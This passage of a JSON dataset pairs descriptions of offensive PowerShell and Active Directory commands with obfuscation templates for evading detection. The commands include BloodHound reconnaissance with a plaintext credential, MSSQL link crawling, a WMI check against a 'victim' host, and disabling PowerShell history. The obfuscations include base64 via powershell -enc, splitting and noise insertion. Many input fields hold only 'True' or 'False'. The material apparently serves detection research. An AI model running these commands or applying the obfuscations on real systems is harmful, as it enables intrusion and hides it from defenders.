    "input": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "BloodHound tool to perform reconnaissance on the specified Active Directory environment, using the provided credentials for authentication.",
    "origin_cmd": "bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all"
  },
  {
    "input": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "output": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose"
  },
  {
    "input": "Check you have enough privileges to execute WMI in the victim system",
    "output": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "Check you have enough privileges to execute WMI in the victim system",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "Check you have enough privileges to execute WMI in the victim system",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "Check you have enough privileges to execute WMI in the victim system",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "Check you have enough privileges to execute WMI in the victim system",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "Check you have enough privileges to execute WMI in the victim system",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "Check you have enough privileges to execute WMI in the victim system",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "Check you have enough privileges to execute WMI in the victim system",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Check you have enough privileges to execute WMI in the victim system",
    "origin_cmd": "Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local"
  },
  {
    "input": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "output": "Remove-Module PSReadline",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disable PowerShell command logging, With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:",
    "origin_cmd": "Remove-Module PSReadline"
  },
  {
    "input": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "output": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Monitoring File System Changes, Sets up a monitor on the file system to track and log any changes, such as file creation, which can be useful for detecting suspicious activity.",
